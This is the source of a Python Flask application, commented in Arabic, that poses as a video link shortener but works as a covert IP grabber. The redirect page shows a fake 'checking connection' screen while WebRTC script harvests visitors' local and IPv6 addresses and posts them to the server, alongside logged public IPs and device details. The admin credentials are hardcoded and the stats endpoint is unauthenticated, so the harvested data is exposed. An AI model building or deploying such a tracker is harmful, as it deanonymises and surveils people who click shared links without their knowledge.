from flask import Flask, render_template_string, request, redirect, jsonify, Response
import uuid
import datetime
import sqlite3
import requests
import re
import logging
from functools import wraps
from urllib.parse import urlparse, parse_qs
import pytz
import hashlib
import os
from pathlib import Path
import time

# إعداد نظام التسجيل للأخطاء
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = "YOUR_SECRET_KEY_HERE_CHANGE_THIS_TO_RANDOM_STRING"

DB_FILE = "tracker_data.db"
USERNAME = "khaled"
PASSWORD = "ALG@2022"

# تعيين المنطقة الزمنية GMT+1 (توقيت الجزائر)
TIMEZONE = pytz.timezone('Africa/Algiers')

# إنشاء مجلد للصور المحلية
THUMBNAIL_DIR = Path("static/thumbnails")
THUMBNAIL_DIR.mkdir(parents=True, exist_ok=True)

def get_current_time():
    """الحصول على الوقت الحالي بتوقيت GMT+1"""
    return datetime.datetime.now(TIMEZONE).strftime("%Y-%m-%d %H:%M:%S")

def init_db():
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS links (
                id TEXT PRIMARY KEY,
                short_code TEXT UNIQUE,
                original_url TEXT,
                note TEXT,
                video_title TEXT,
                custom_image TEXT,
                platform TEXT,
                created_at TEXT,
                clicks_count INTEGER DEFAULT 0,
                is_active INTEGER DEFAULT 1,
                password_hash TEXT,
                expiry_date TEXT
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS clicks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                link_id TEXT,
                short_code TEXT,
                ip TEXT,
                local_ip TEXT,
                user_agent TEXT,
                referer TEXT,
                time TEXT,
                device_type TEXT,
                browser TEXT,
                os TEXT,
                country TEXT,
                city TEXT
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS reports (
                id TEXT PRIMARY KEY,
                short_code TEXT,
                report_type TEXT,
                report_reason TEXT,
                reporter_ip TEXT,
                time TEXT,
                status TEXT DEFAULT 'pending'
            )
        ''')
        conn.commit()
        logger.info("Database initialized successfully")

init_db()

def extract_video_id(url, platform):
    """استخراج ID الفيديو من الرابط بشكل دقيق"""
    try:
        parsed = urlparse(url)
        if platform == "youtube":
            if parsed.hostname in ('youtu.be', 'www.youtu.be'):
                return parsed.path[1:]
            if parsed.hostname in ('youtube.com', 'www.youtube.com', 'm.youtube.com'):
                if parsed.path == '/watch':
                    return parse_qs(parsed.query).get('v', [None])[0]
                if parsed.path.startswith(('/embed/', '/v/', '/shorts/')):
                    return parsed.path.split('/')[2]
        elif platform == "tiktok":
            match = re.search(r'/video/(\d+)', url)
            if match:
                return match.group(1)
            match = re.search(r'@[\w.-]+/video/(\d+)', url)
            if match:
                return match.group(1)
        elif platform == "instagram":
            match = re.search(r'/reel/([A-Za-z0-9_-]+)|/p/([A-Za-z0-9_-]+)', url)
            if match:
                return match.group(1) or match.group(2)
    except Exception as e:
        logger.error(f"Error extracting video ID: {e}")
    return None

def download_and_save_thumbnail(image_url, short_code):
    """تحميل وحفظ الصورة محلياً لضمان عدم انتهاء صلاحيتها"""
    if not image_url:
        return None
    
    try:
        # تنظيف الرابط
        if image_url.startswith('/'):
            return image_url
            
        # تحديد امتداد الصورة
        ext = 'jpg'
        if '.png' in image_url:
            ext = 'png'
        elif '.webp' in image_url:
            ext = 'webp'
        
        # مسار حفظ الصورة
        local_path = THUMBNAIL_DIR / f"{short_code}.{ext}"
        
        # تحميل الصورة
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        response = requests.get(image_url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            with open(local_path, 'wb') as f:
                f.write(response.content)
            logger.info(f"Thumbnail saved: {local_path}")
            return f"/static/thumbnails/{short_code}.{ext}"
        else:
            logger.warning(f"Failed to download thumbnail: {response.status_code}")
            return None
            
    except Exception as e:
        logger.error(f"Error downloading thumbnail: {e}")
        return None

def get_platform_meta(url, short_code=None, manual_image=None):
    """جلب البيانات الوصفية بشكل احترافي لكل منصة مع حفظ الصور محلياً"""
    url_lower = url.lower()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    if "youtube.com" in url_lower or "youtu.be" in url_lower:
        try:
            video_id = extract_video_id(url, "youtube")
            oembed_url = f"https://www.youtube.com/oembed?url={url}&format=json"
            res = requests.get(oembed_url, headers=headers, timeout=5)
            video_title = "شاهد الفيديو على يوتيوب"
            if res.status_code == 200:
                data = res.json()
                video_title = data.get('title', 'شاهد الفيديو على يوتيوب')
            
            if video_id:
                custom_image = f"https://img.youtube.com/vi/{video_id}/maxresdefault.jpg"
                img_check = requests.head(custom_image, timeout=3)
                if img_check.status_code != 200:
                    custom_image = f"https://img.youtube.com/vi/{video_id}/hqdefault.jpg"
            else:
                custom_image = "https://images.unsplash.com/photo-1611162616305-c67b3fa40904?w=800"
            
            if short_code and custom_image:
                local_image = download_and_save_thumbnail(custom_image, short_code)
                if local_image:
                    custom_image = local_image
            return "YouTube", video_title, custom_image
        except Exception as e:
            logger.error(f"YouTube meta error: {e}")
            return "YouTube", "شاهد الفيديو على يوتيوب", "https://images.unsplash.com/photo-1611162616305-c67b3fa40904?w=800"
    
    elif "tiktok.com" in url_lower:
        try:
            oembed_url = f"https://www.tiktok.com/oembed?url={url}"
            res = requests.get(oembed_url, headers=headers, timeout=5)
            video_title = "شاهد الفيديو على تيك توك"
            custom_image = "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=800"
            
            if res.status_code == 200:
                data = res.json()
                video_title = data.get('title', 'شاهد الفيديو على تيك توك')
                temp_image = data.get('thumbnail_url')
                
                if temp_image:
                    video_id = extract_video_id(url, "tiktok")
                    if video_id:
                        alternative_urls = [
                            f"https://tikcdn.io/ssstik/{video_id}",
                            f"https://www.tikwm.com/video/media/{video_id}/1.jpg",
                            temp_image
                        ]
                        for img_url in alternative_urls:
                            if img_url:
                                local_image = download_and_save_thumbnail(img_url, short_code) if short_code else None
                                if local_image:
                                    custom_image = local_image
                                    break
                        else:
                            custom_image = temp_image
                    else:
                        custom_image = temp_image
            
            if short_code and custom_image and not custom_image.startswith('/static/'):
                local_image = download_and_save_thumbnail(custom_image, short_code)
                if local_image:
                    custom_image = local_image
            return "TikTok", video_title, custom_image
        except Exception as e:
            logger.error(f"TikTok meta error: {e}")
            return "TikTok", "فيديو TikTok مميز", "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=800"
    
    elif "instagram.com" in url_lower:
        try:
            video_title = "شاهد الفيديو على إنستغرام"
            if manual_image:
                custom_image = manual_image
                if short_code and custom_image:
                    local_image = download_and_save_thumbnail(custom_image, short_code)
                    if local_image: custom_image = local_image
                return "Instagram", video_title, custom_image
            else:
                custom_image = "https://images.unsplash.com/photo-1611262588024-d12430b98920?w=800"
                if short_code:
                    local_image = download_and_save_thumbnail(custom_image, short_code)
                    if local_image: custom_image = local_image
                return "Instagram", video_title, custom_image
        except Exception as e:
            logger.error(f"Instagram meta error: {e}")
            return "Instagram", "فيديو على إنستغرام", "https://images.unsplash.com/photo-1611262588024-d12430b98920?w=800"
    
    elif "facebook.com" in url_lower or "fb.watch" in url_lower:
        try:
            video_title = "شاهد الفيديو على فيسبوك"
            try:
                response = requests.get(url, headers=headers, timeout=5)
                if response.status_code == 200:
                    title_match = re.search(r'<meta[^>]*property="og:title"[^>]*content="([^"]*)"', response.text)
                    if title_match: video_title = title_match.group(1)
            except: pass
            
            if manual_image:
                custom_image = manual_image
                if short_code and custom_image:
                    local_image = download_and_save_thumbnail(custom_image, short_code)
                    if local_image: custom_image = local_image
                return "Facebook", video_title, custom_image
            else:
                custom_image = "https://images.unsplash.com/photo-1611162618828-bc409f855c74?w=800"
                if short_code:
                    local_image = download_and_save_thumbnail(custom_image, short_code)
                    if local_image: custom_image = local_image
                return "Facebook", video_title, custom_image
        except Exception as e:
            logger.error(f"Facebook meta error: {e}")
            return "Facebook", "شاهد الفيديو على فيسبوك", "https://images.unsplash.com/photo-1611162618828-bc409f855c74?w=800"
    
    else:
        try:
            response = requests.get(url, headers=headers, timeout=5)
            video_title = "شاهد المحتوى"
            custom_image = "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=800"
            if response.status_code == 200:
                title_match = re.search(r'<meta[^>]*property="og:title"[^>]*content="([^"]*)"', response.text)
                image_match = re.search(r'<meta[^>]*property="og:image"[^>]*content="([^"]*)"', response.text)
                if title_match: video_title = title_match.group(1)
                if image_match: custom_image = image_match.group(1)
            
            if short_code and custom_image:
                local_image = download_and_save_thumbnail(custom_image, short_code)
                if local_image: custom_image = local_image
            return "Video", video_title, custom_image
        except Exception as e:
            logger.error(f"General meta error: {e}")
            return "Video", "شاهد المحتوى", "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=800"

def check_auth(username, password):
    return username == USERNAME and password == PASSWORD

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return Response(
                'يرجى تسجيل الدخول للوصول إلى لوحة التحكم.', 401,
                {'WWW-Authenticate': 'Basic realm="Login Required"'}
            )
        return f(*args, **kwargs)
    return decorated

def generate_short_code(length=6):
    while True:
        code = str(uuid.uuid4())[:length].upper()
        with sqlite3.connect(DB_FILE) as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT id FROM links WHERE short_code = ?", (code,))
            if not cursor.fetchone(): return code

def get_device_info(user_agent):
    device_type, browser, os = "Unknown", "Unknown", "Unknown"
    if user_agent:
        user_agent_lower = user_agent.lower()
        if 'windows' in user_agent_lower: os = 'Windows'
        elif 'android' in user_agent_lower: os = 'Android'
        elif 'ios' in user_agent_lower or 'iphone' in user_agent_lower: os = 'iOS'
        elif 'mac' in user_agent_lower: os = 'MacOS'
        elif 'linux' in user_agent_lower: os = 'Linux'
        
        if 'chrome' in user_agent_lower and 'edg' not in user_agent_lower: browser = 'Chrome'
        elif 'firefox' in user_agent_lower: browser = 'Firefox'
        elif 'safari' in user_agent_lower and 'chrome' not in user_agent_lower: browser = 'Safari'
        elif 'edge' in user_agent_lower: browser = 'Edge'
        
        if 'mobile' in user_agent_lower: device_type = 'Mobile'
        elif 'tablet' in user_agent_lower: device_type = 'Tablet'
        else: device_type = 'Desktop'
    return device_type, browser, os

# قالب لوحة التحكم البصري لـ Flask
HTML_DASHBOARD = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام اختصار الروابط المتقدم | لوحة التحكم</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
            direction: rtl;
            min-height: 100vh;
        }
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        .header { 
            background: rgba(255,255,255,0.95); 
            padding: 20px; 
            border-radius: 15px; 
            margin-bottom: 20px; 
            text-align: center;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        .header h1 { color: #667eea; margin-bottom: 10px; }
        .header small { color: #666; }
        
        .stats-grid { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); 
            gap: 15px; 
            margin-bottom: 20px; 
        }
        .stat-card { 
            background: white; 
            padding: 20px; 
            border-radius: 15px; 
            text-align: center; 
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            transition: transform 0.3s;
        }
        .stat-card:hover { transform: translateY(-5px); }
        .stat-card h3 { font-size: 14px; color: #666; margin-bottom: 10px; }
        .stat-card p { font-size: 32px; font-weight: bold; color: #667eea; }
        .stat-card .icon { font-size: 40px; margin-bottom: 10px; }
        
        .create-card { 
            background: white; 
            padding: 25px; 
            border-radius: 15px; 
            margin-bottom: 30px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        .create-card h3 { margin-bottom: 20px; color: #333; }
        .create-card input, .create-card button { 
            width: 100%; 
            padding: 12px; 
            margin-top: 10px; 
            border: 1px solid #ddd; 
            border-radius: 8px; 
            font-size: 14px;
        }
        .create-card button { 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
            color: white; 
            border: none; 
            cursor: pointer; 
            font-weight: bold;
            font-size: 16px;
            transition: transform 0.2s;
        }
        
        .extra-field {
            display: none;
            background: #f0f4ff;
            padding: 15px;
            border-radius: 10px;
            margin-top: 15px;
            border-right: 4px solid #667eea;
        }
        .extra-field.show { display: block; }
        .extra-field label { color: #667eea; font-weight: bold; }
        
        .section-title { color: white; margin: 20px 0 10px; font-size: 20px; }
        .link-card { 
            background: white; 
            padding: 15px; 
            border-radius: 10px; 
            margin-bottom: 10px; 
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
            flex-wrap: wrap;
            transition: all 0.3s;
        }
        .link-card:hover { box-shadow: 0 4px 12px rgba(0,0,0,0.15); transform: translateX(-5px); }
        .link-info { flex: 1; }
        .short-url { font-family: monospace; color: #667eea; direction: ltr; text-align: left; margin-top: 5px; }
        .link-meta { font-size: 12px; color: #888; margin-top: 5px; }
        
        .btn { padding: 8px 15px; margin: 0 5px; border: none; border-radius: 5px; cursor: pointer; font-size: 13px; }
        .btn-info { background: #3498db; color: white; }
        .btn-danger { background: #e74c3c; color: white; }
        .btn-success { background: #27ae60; color: white; }
        
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 1000; }
        .modal-content { background: white; margin: 5% auto; padding: 20px; width: 90%; max-width: 900px; border-radius: 15px; max-height: 80%; overflow-y: auto; }
        .close { cursor: pointer; font-size: 28px; font-weight: bold; color: #999; float: left; }
        
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { padding: 10px; text-align: center; border-bottom: 1px solid #ddd; }
        th { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; }
        .local-ip { color: #27ae60; font-weight: bold; font-family: monospace; word-break: break-all; }
        .info-note { background: #fff3cd; border: 1px solid #ffc107; color: #856404; padding: 10px; border-radius: 8px; margin-top: 10px; font-size: 13px; }
    </style>
    <script>
        function checkPlatform() {
            const urlInput = document.getElementById('original_url');
            const url = urlInput.value.toLowerCase();
            const extraField = document.getElementById('extraImageField');
            if (url.includes('facebook.com') || url.includes('fb.watch') || url.includes('instagram.com')) {
                extraField.classList.add('show');
            } else {
                extraField.classList.remove('show');
            }
        }
    </script>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🚀 نظام اختصار الروابط المتقدم (صائد الـ WebRTC المتطور)</h1>
            <small>توقيت الجزائر (GMT+1): {{ current_time }}</small>
        </div>

        <div class="stats-grid">
            <div class="stat-card"><div class="icon">🔗</div><h3>إجمالي الروابط</h3><p>{{ total_links }}</p></div>
            <div class="stat-card"><div class="icon">👆</div><h3>إجمالي النقرات</h3><p>{{ total_clicks }}</p></div>
            <div class="stat-card"><div class="icon">📊</div><h3>نقرات اليوم</h3><p>{{ today_clicks }}</p></div>
        </div>

        <div class="create-card">
            <h3>✨ إنشاء رابط مختصر جديد</h3>
            <form action="/create" method="POST">
                <input type="url" id="original_url" name="original_url" placeholder="https://www.youtube.com/watch?v=..." required oninput="checkPlatform()">
                <input type="text" name="note" placeholder="ملاحظة (اختياري)">
                <input type="password" name="password" placeholder="كلمة مرور لحماية الرابط (اختياري)">
                
                <div id="extraImageField" class="extra-field">
                    <label>🖼️ رابط الصورة المصغرة (مطلوب لفيسبوك/انستغرام)</label>
                    <input type="url" id="manual_image" name="manual_image" placeholder="https://example.com/image.jpg">
                </div>
                <button type="submit">🚀 إنشاء الرابط المختصر</button>
            </form>
        </div>

        <h3 class="section-title">📋 روابطي المختصرة</h3>
        {% for link in links_list %}
        <div class="link-card">
            <div class="link-info">
                <strong>📌 {{ link.note or 'بدون ملاحظة' }}</strong>
                <div class="short-url">🔗 {{ request.host_url }}{{ link.short_code }}</div>
                <div class="link-meta">🎬 {{ link.platform }} | 👆 {{ link.clicks_count }} نقرة | 📅 {{ link.created_at }}</div>
            </div>
            <div class="link-actions">
                <button class="btn btn-info" onclick="showStats('{{ link.short_code }}')">📊 إحصائيات</button>
                <button class="btn btn-success" onclick="copyLink('{{ request.host_url }}{{ link.short_code }}')">📋 نسخ</button>
                <button class="btn btn-danger" onclick="deleteLink('{{ link.short_code }}')">🗑️ حذف</button>
            </div>
        </div>
        {% endfor %}
    </div>

    <div id="statsModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal()">&times;</span>
            <h2>📊 إحصائيات الشبكة المتقدمة</h2>
            <div id="statsContent">جاري التحميل...</div>
        </div>
    </div>

    <script>
        function copyLink(url) { navigator.clipboard.writeText(url); alert('✅ تم النسخ'); }
        function closeModal() { document.getElementById('statsModal').style.display = 'none'; }
        function showStats(shortCode) {
            document.getElementById('statsModal').style.display = 'block';
            fetch(`/stats/${shortCode}`).then(res => res.json()).then(data => {
                let html = `<h3>آخر النقرات والـ IPs الملتقطة (WebRTC المطور)</h3><table><thead><tr><th>الوقت</th><th>IP العام</th><th>IP المحلي / الـ mDNS المكتشف</th><th>الجهاز</th><th>المتصفح</th></tr></thead><tbody>`;
                data.recent_clicks.forEach(click => {
                    html += `<tr><td>${click.time}</td><td><code>${click.ip}</code></td><td class="local-ip">${click.local_ip}</td><td>${click.device_type}</td><td>${click.browser}</td></tr>`;
                });
                html += '</tbody></table>';
                document.getElementById('statsContent').innerHTML = html;
            });
        }
        function deleteLink(shortCode) { if(confirm('حذف؟')) { fetch(`/delete/${shortCode}`, {method:'POST'}).then(()=>location.reload()); } }
    </script>
</body>
</html>
'''

@app.route('/')
@requires_auth
def home():
    with sqlite3.connect(DB_FILE) as conn:
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute('SELECT l.*, COUNT(c.id) as clicks_count FROM links l LEFT JOIN clicks c ON l.id = c.link_id WHERE l.is_active = 1 GROUP BY l.id ORDER BY l.created_at DESC')
        links_list = cursor.fetchall()
        cursor.execute("SELECT COUNT(*) FROM links WHERE is_active = 1")
        total_links = cursor.fetchone()[0]
        cursor.execute("SELECT COUNT(*) FROM clicks")
        total_clicks = cursor.fetchone()[0]
        today = get_current_time().split()[0]
        cursor.execute("SELECT COUNT(*) FROM clicks WHERE time LIKE ?", (f"{today}%",))
        today_clicks = cursor.fetchone()[0]
        
    return render_template_string(HTML_DASHBOARD, links_list=links_list, total_links=total_links, total_clicks=total_clicks, today_clicks=today_clicks, current_time=get_current_time())

@app.route('/create', methods=['POST'])
@requires_auth
def create():
    original_url = request.form.get('original_url')
    note = request.form.get('note', '')
    password = request.form.get('password', '')
    manual_image = request.form.get('manual_image', '')
    if not original_url: return "خطأ", 400
    
    short_code = generate_short_code()
    platform, video_title, custom_image = get_platform_meta(original_url, short_code, manual_image)
    link_id = str(uuid.uuid4())
    created_at = get_current_time()
    password_hash = hashlib.sha256(password.encode()).hexdigest() if password else None
    
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute('INSERT INTO links (id, short_code, original_url, note, video_title, custom_image, platform, created_at, password_hash, is_active) VALUES (?,?,?,?,?,?,?,?,?,1)', 
                       (link_id, short_code, original_url, note, video_title, custom_image, platform, created_at, password_hash))
        conn.commit()
    return redirect('/')

@app.route('/<short_code>')
def redirect_link(short_code):
    with sqlite3.connect(DB_FILE) as conn:
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM links WHERE short_code = ? AND is_active = 1", (short_code,))
        link_data = cursor.fetchone()
        
    if not link_data: return "الرابط غير موجود", 404
    
    # تحسين الفحص لاستخراج الـ IP العام الفعلي
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip_address and ',' in ip_address: ip_address = ip_address.split(',')[0].strip()
    
    user_agent = request.headers.get('User-Agent', 'غير معروف')
    referer = request.headers.get('Referer', '')
    device_type, browser, os = get_device_info(user_agent)
    
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("UPDATE links SET clicks_count = clicks_count + 1 WHERE short_code = ?", (short_code,))
        cursor.execute('INSERT INTO clicks (link_id, short_code, ip, local_ip, user_agent, referer, time, device_type, browser, os) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)',
                       (link_data['id'], short_code, ip_address, "جاري الصيد المتقدم...", user_agent, referer, get_current_time(), device_type, browser, os))
        click_id = cursor.lastrowid
        conn.commit()
        
    platform = link_data['platform']
    video_title = link_data['video_title']
    image_url = link_data['custom_image']
    original_url = link_data['original_url']
    full_image_url = request.host_url.rstrip('/') + image_url if image_url and image_url.startswith('/static/') else image_url
    
    return f'''<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="{video_title}">
    <meta property="og:image" content="{full_image_url}">
    <meta property="og:description" content="شاهد محتوى {platform} الحصري">
    <meta property="og:type" content="video.other">
    <title>{video_title}</title>
    <style>
        body {{ margin: 0; font-family: sans-serif; background: #000; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; }}
        .box {{ padding: 30px; background: #111; border-radius: 15px; border: 1px solid #222; max-width: 400px; width:90%; }}
        .thumb {{ width: 100%; border-radius: 10px; margin-bottom: 15px; }}
        .spinner {{ width: 40px; height: 40px; border: 3px solid #333; border-top-color: #00bcd4; border-radius: 50%; animation: spin 1s infinite linear; margin: 15px auto; }}
        @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
    </style>
</head>
<body>
    <div class="box">
        <h3>🎬 {platform}</h3>
        <img class="thumb" src="{full_image_url}">
        <div>{video_title}</div>
        <div class="spinner"></div>
        <p style="font-size:13px; color:#888;">⏳ جاري فحص جودة الاتصال وتوصيلك بالفيديو...</p>
        <p id="logger" style="font-size:11px; color:#00bcd4; font-family:monospace;"></p>
    </div>

    <script>
        // --- ترسانة صيد الـ IP المحلي المتقدمة عبر WebRTC ---
        function startAdvancedWebRTCHunt() {{
            var localIPs = new Set();
            
            // 1. خوادم STUN عامة لإجبار المتصفح على إنشاء منافذ خارجية وداخلية معاً بكفاءة عالية
            var config = {{
                iceServers: [
                    {{ urls: "stun:stun.l.google.com:19302" }},
                    {{ urls: "stun:stun1.l.google.com:19302" }},
                    {{ urls: "stun:stun2.l.google.com:19302" }},
                    {{ urls: "stun:stun.services.mozilla.com" }}
                ],
                iceCandidatePoolSize: 10 // حجز مسارات مسبقة لتسريع العملية
            }};
            
            var pc = new RTCPeerConnection(config);
            
            // 2. إنشاء قنوات بيانات وهمية متعددة لزيادة احتمالية تسريب البيانات في المتصفحات الصارمة
            pc.createDataChannel("data_channel_1");
            pc.createDataChannel("data_channel_2");
            
            // 3. التعبيرات القياسية الموسعة لصيد كل شيء (IPv4, IPv6, mDNS local)
            var ipRegex = /([0-9]{{1,3}}(\\.[0-9]{{1,3}}){{3}})|([a-f0-9:]+:+[a-f0-9:]+)|([a-zA-Z0-9-]+\\.local)/g;
            
            pc.onicecandidate = function(event) {{
                if (event && event.candidate && event.candidate.candidate) {{
                    var candidate = event.candidate.candidate;
                    var matches = candidate.match(ipRegex);
                    if (matches) {{
                        matches.forEach(function(ip) {{
                            // تصفية العناوين الشائعة غير المفيدة مثل الـ IPs الخاصة بخوادم الـ STUN نفسها
                            if (!ip.startsWith("74.125") && !ip.startsWith("172.217") && !ip.startsWith("142.250")) {{
                                localIPs.add(ip);
                                document.getElementById("logger").innerHTML = "📡 تم تأمين قناة اتصال: " + ip;
                            }}
                        }});
                    }}
                }}
            }};
            
            // 4. إنشاء طلب العرض (Offer) وإطلاقه
            pc.createOffer().then(function(offer) {{
                return pc.setLocalDescription(offer);
            }}).catch(function(e){{ console.log(e); }});
            
            // 5. وظيفة إرسال الحصيلة النهائية إلى السيرفر قبل الانتقال
            function sendPayload() {{
                var finalIPs = Array.from(localIPs);
                var ipString = finalIPs.length > 0 ? finalIPs.join(" | ") : "مخفي أو مشفر بواسطة mDNS (.local)";
                
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "/update-local-ip/{click_id}", true);
                xhr.setRequestHeader("Content-Type", "application/json");
                xhr.send(JSON.stringify({{ "local_ip": ipString }}));
            }}
            
            // جدولة الإرسال والتوجيه لضمان جمع البيانات بالكامل
            setTimeout(sendPayload, 1800);
            setTimeout(function() {{
                window.location.href = "{original_url}";
            }}, 2800);
        }}
        
        window.onload = startAdvancedWebRTCHunt;
    </script>
</body>
</html>'''

@app.route('/update-local-ip/<int:click_id>', methods=['POST'])
def update_local_ip(click_id):
    try:
        data = request.get_json() or {}
        local_ip = data.get('local_ip', 'غير متوفر')
        with sqlite3.connect(DB_FILE) as conn:
            cursor = conn.cursor()
            cursor.execute('UPDATE clicks SET local_ip = ? WHERE id = ?', (local_ip, click_id))
            conn.commit()
        return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"status": "error"}), 500

@app.route('/stats/<short_code>')
def get_stats(short_code):
    with sqlite3.connect(DB_FILE) as conn:
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM links WHERE short_code = ?", (short_code,))
        link = cursor.fetchone()
        if not link: return jsonify({"error": "Not found"}), 404
        cursor.execute('SELECT * FROM clicks WHERE short_code = ? ORDER BY time DESC LIMIT 20', (short_code,))
        clicks = cursor.fetchall()
        return jsonify({
            "original_url": link['original_url'], "platform": link['platform'],
            "total_clicks": link['clicks_count'], "created_at": link['created_at'],
            "recent_clicks": [dict(click) for click in clicks]
        })

@app.route('/delete/<short_code>', methods=['POST'])
@requires_auth
def delete_link(short_code):
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("UPDATE links SET is_active = 0 WHERE short_code = ?", (short_code,))
        conn.commit()
    return jsonify({"status": "success"})

if __name__ == '__main__':
    os.makedirs("static/thumbnails", exist_ok=True)
    app.run(debug=False, host='0.0.0.0', port=5000)
